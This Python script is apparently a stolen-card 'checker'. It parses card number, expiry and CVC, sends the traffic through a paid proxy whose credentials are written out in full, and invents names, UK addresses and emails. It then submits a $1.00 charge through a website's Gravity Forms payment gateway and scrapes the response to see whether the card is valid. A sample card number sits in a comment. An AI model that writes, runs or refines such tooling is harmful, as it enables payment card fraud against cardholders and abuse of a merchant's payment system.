import random
import string
import requests
from user_agent import generate_user_agent
from proxy import reqproxy, make_request
import json
import re

#============================================
def generate_full_name():
    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan", "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa", "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha", "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada", "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar", "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia", "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem", "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia", "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"]
    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown", "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White", "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar", "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera", "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza", "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard", "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell", "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"]
    return random.choice(first_names), random.choice(last_names)

def generate_address():
    cities = ["London", "Birmingham", "Manchester", "Liverpool", "Leeds", "Glasgow", "Sheffield", "Edinburgh", "Bristol", "Cardiff"]
    states = ["England", "England", "England", "England", "England", "Scotland", "England", "Scotland", "England", "Wales"]
    streets = ["Baker St", "Oxford St", "High St", "King's Rd", "Abbey Rd", "The Strand", "Regent St", "Whitehall", "Fleet St", "Pall Mall"]
    zip_codes = ["SW1A 1AA", "W1D 3QF", "M1 1AE", "N1C 4AG", "EC1A 1BB", "SE1 8XX", "B1 1AA", "RG1 8DN", "SW1E 5RS", "B2 5DT"]
    
    city = random.choice(cities)
    street_address = f"{random.randint(1, 999)} {random.choice(streets)}"
    zip_code = random.choice(zip_codes)
    return street_address, city, "GB", zip_code, f"07{random.randint(100000000, 999999999)}"

def generate_email():
    return f"user{random.randint(10000,99999)}@example.com"

def generate_username():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))

def generate_random_code(length=32):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

#============================================
def Tele(ccx):
    proxy_str = "brd.superproxy.io:33335:brd-customer-hl_5c664e64-zone-datacenter_proxy1:0bnfn02i83lj"
    session, ip = reqproxy(proxy_str)
    #print(f"IP Address: {ip}")
    ccx=ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:#Mo3gza
        yy = yy.split("20")[1]
    elif "01" in mm or "02" in mm or "01" in mm or "03" in mm or "04" in mm or "05" in mm or "06" in mm or "07" in mm or "08" in mm or "09" in mm:
        mm = mm.split("0")[1]

    user = generate_user_agent()
    r = requests.Session()
    r.verify = False
    
    first_name, last_name = generate_full_name()
    kaddress, city, country, postcode, phone =     generate_address()
    kaddress, city, country, postcode, phone = generate_address()
    email = generate_email()
    username = generate_username()
    corr = generate_random_code()
    sess = generate_random_code()
    nr = random.randint(100000, 999999)
    lr = random.randint(1000, 9999)
    
    cookies = {
        '__cf_bm': 'WJacIjhlBjaroSWoiizRVuB9dGyhDm7.3qc10kmxCJg-1778041438.330217-1.0.1.1-bZck1P4EIO7tK5CFq..FGsz8M_aUJC03OhsjSxBYDtOWhiIgaIToqqvlhyEZ8mLyxA7s9tiBTP2zzXBeTnnpYLZRvqi1LaNOkcwG8vpsbFT8jDlNrG707ToNa5dKucMo',
    }
    
    headers = {
        'authority': 'fertile.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        # 'cookie': '__cf_bm=WJacIjhlBjaroSWoiizRVuB9dGyhDm7.3qc10kmxCJg-1778041438.330217-1.0.1.1-bZck1P4EIO7tK5CFq..FGsz8M_aUJC03OhsjSxBYDtOWhiIgaIToqqvlhyEZ8mLyxA7s9tiBTP2zzXBeTnnpYLZRvqi1LaNOkcwG8vpsbFT8jDlNrG707ToNa5dKucMo',
        'referer': 'https://www.google.com/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'cross-site',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    
    response = session.get('https://fertile.com/authorize-payment-gateway/', #cookies=cookies, 
    headers=headers)
    
    ajax = re.search(r"hash=(.*?)'", response.text).group(1)
    currency = re.search(r"data-currency='USD' value='(.*?)'", response.text).group(1)
    state = re.search(r"name='state_56' value='(.*?)'", response.text).group(1)
    version = re.search(r'"version_hash":"(.*?)"', response.text).group(1)
    #print(version)
    
    cookies = {
        'nitroCachedPage': '0',
        '_gcl_au': '1.1.929784843.1778041174',
        '_hjSessionUser_3373929': 'eyJpZCI6IjI5MjJhNDA4LTUwZGItNWQ4OC1hN2U2LTRmNjM1NmFmOTFjMiIsImNyZWF0ZWQiOjE3NzgwNDExNzUzNDIsImV4aXN0aW5nIjpmYWxzZX0=',
        '_hjSession_3373929': 'eyJpZCI6IjMxZTE2N2I5LTM1Y2MtNGE4Ni05ZGJkLTgxNWZiY2E4YzM4MyIsImMiOjE3NzgwNDExNzUzNDcsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=',
        '_uetsid': 'ca0f78b0490211f1bb8707b1cf807b19',
        '_uetvid': 'ca0fc130490211f192f36b32a9acc918',
        '_ga_0TF611FJG1': 'GS2.1.s1778041175$o1$g0$t1778041175$j60$l0$h0',
        '_ga': 'GA1.1.2037000988.1778041176',
        '_ga_VEBRRXQ3S8': 'GS2.1.s1778041175$o1$g0$t1778041176$j59$l0$h0',
        '_fbp': 'fb.1.1778041176982.906889328593270657',
        '_clck': '5ngme9%5E2%5Eg5t%5E0%5E2317',
        'cf_clearance': '3rn3IKtx41vD41Xoma6MuPjPZcSlWpkxwstN0_LgBnA-1778041178-1.2.1.1-Gn0w5Tpwne4rWid2s_Kbr9TdyCJsFI6rPbD_c7XDep2bgPtgW6P9yZlcWQuxGCKrRVhK_xOLgnv8aU61UcjFiC2mUl03Xjy389wciy_R1sIb724GwIr.hg3nDFqMYPPZtYUSqOopVlqtl7F.cUwcKk26oN9ZimU34IPyP487g6CQ7QLTpytydK26N44P4DvFev44o6z3eN_ZsacBvDRF3XD.5.u1.zY614D7FULCQBe1X2BRuQAdvZzIyQBosFFHRZl7jid_2o2LtHxi9dXCO0c508e.8PqhPdilONE4onVIwFhu0KGNY0OqiQ4V9ZKMOcwquLe7r8PEI5.BQodS4Q',
        '__cf_bm': 'OS3n7LyTwbluqYZ7iDChsCVQI_KEWIm9oSeLEh50O7U-1778041178.9093635-1.0.1.1-UG1fRTNtHeuWES8f8ieg0Yd77PQSHiyETnvIHWBYFBECtbWKk8UJbwOwubXvV5_3bCkTMzskXlhsLcK91wkPspAPfcqaBnstNAgMK1I8mQRI070vSMlocJsyPThrwS3D',
        'formillaVisitorGuidcsa2ec8c-70bb-4113-82b7-4a017464e17b': 'bcb248bb-3b78-4cf1-b671-af0ddf71ee64',
        '_clsk': '1ocm1xp%5E1778041179842%5E1%5E1%5Ee.clarity.ms%2Fcollect',
    }
    
    headers = {
        'authority': 'fertile.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        #'content-type': 'multipart/form-data; boundary=----WebKitFormBoundary9Cjy3D6lUAVL3OzT',
        # 'cookie': 'nitroCachedPage=0; _gcl_au=1.1.929784843.1778041174; _hjSessionUser_3373929=eyJpZCI6IjI5MjJhNDA4LTUwZGItNWQ4OC1hN2U2LTRmNjM1NmFmOTFjMiIsImNyZWF0ZWQiOjE3NzgwNDExNzUzNDIsImV4aXN0aW5nIjpmYWxzZX0=; _hjSession_3373929=eyJpZCI6IjMxZTE2N2I5LTM1Y2MtNGE4Ni05ZGJkLTgxNWZiY2E4YzM4MyIsImMiOjE3NzgwNDExNzUzNDcsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; _uetsid=ca0f78b0490211f1bb8707b1cf807b19; _uetvid=ca0fc130490211f192f36b32a9acc918; _ga_0TF611FJG1=GS2.1.s1778041175$o1$g0$t1778041175$j60$l0$h0; _ga=GA1.1.2037000988.1778041176; _ga_VEBRRXQ3S8=GS2.1.s1778041175$o1$g0$t1778041176$j59$l0$h0; _fbp=fb.1.1778041176982.906889328593270657; _clck=5ngme9%5E2%5Eg5t%5E0%5E2317; cf_clearance=3rn3IKtx41vD41Xoma6MuPjPZcSlWpkxwstN0_LgBnA-1778041178-1.2.1.1-Gn0w5Tpwne4rWid2s_Kbr9TdyCJsFI6rPbD_c7XDep2bgPtgW6P9yZlcWQuxGCKrRVhK_xOLgnv8aU61UcjFiC2mUl03Xjy389wciy_R1sIb724GwIr.hg3nDFqMYPPZtYUSqOopVlqtl7F.cUwcKk26oN9ZimU34IPyP487g6CQ7QLTpytydK26N44P4DvFev44o6z3eN_ZsacBvDRF3XD.5.u1.zY614D7FULCQBe1X2BRuQAdvZzIyQBosFFHRZl7jid_2o2LtHxi9dXCO0c508e.8PqhPdilONE4onVIwFhu0KGNY0OqiQ4V9ZKMOcwquLe7r8PEI5.BQodS4Q; __cf_bm=OS3n7LyTwbluqYZ7iDChsCVQI_KEWIm9oSeLEh50O7U-1778041178.9093635-1.0.1.1-UG1fRTNtHeuWES8f8ieg0Yd77PQSHiyETnvIHWBYFBECtbWKk8UJbwOwubXvV5_3bCkTMzskXlhsLcK91wkPspAPfcqaBnstNAgMK1I8mQRI070vSMlocJsyPThrwS3D; formillaVisitorGuidcsa2ec8c-70bb-4113-82b7-4a017464e17b=bcb248bb-3b78-4cf1-b671-af0ddf71ee64; _clsk=1ocm1xp%5E1778041179842%5E1%5E1%5Ee.clarity.ms%2Fcollect',
        'origin': 'https://fertile.com',
        'referer': 'https://fertile.com/authorize-payment-gateway/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'iframe',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    
    files = [
        ('input_16', (None, '')),
        ('input_10', (None, '$ 1.00')),
        ('input_11', (None, '1')),
        ('input_5.1', (None, f'{n}')),
        ('input_5.2[]', (None, f'{mm}')),
        ('input_5.2[]', (None, f'20{yy}')),
        ('input_5.3', (None, f'{cvc}')),
        ('input_5.5', (None, f'{first_name} {last_name}')),
        ('input_14', (None, f'{first_name} {last_name}')),
        ('input_13', (None, f'yellhtetgaung{nr}@gmail.com')),
        ('input_15', (None, 'https://www.google.com/')),
        ('gform_ajax', (None, f'form_id=56&title=&description=&tabindex=49&theme=gravity-theme&styles=[]&hash={ajax}')),
        ('gform_submission_method', (None, 'iframe')),
        ('gform_theme', (None, 'gravity-theme')),
        ('gform_style_settings', (None, '[]')),
        ('is_submit_56', (None, '1')),
        ('gform_submit', (None, '56')),
        ('gform_currency', (None, f'{currency}')),
        ('gform_unique_id', (None, '')),
        ('state_56', (None, f'{state}')),
        ('gform_target_page_number_56', (None, '0')),
        ('gform_source_page_number_56', (None, '1')),
        ('gform_field_values', (None, 'check=First+Choice%2CSecond+Choice')),
        ('version_hash', (None, f'{version}')),
        ('gform_submission_speeds', (None, '{"pages":{"1":[82409]}}')),
    ]
    
    response = session.post('https://fertile.com/authorize-payment-gateway/', #cookies=cookies, 
    headers=headers, files=files)
    
    try:
        result = re.search(r"class='gfield_description validation_message gfield_validation_message'><!-- (.*?)<\/div><\/fieldset>", response.text).group(1)
    except:
        result = re.search(r"class='gform_confirmation_message_56 gform_confirmation_message'>(.*?)<\/div><\/div>", response.text).group(1)
    return result
    
#test_card = "4001421623736484|03|29|855"
#print(Tele(test_card))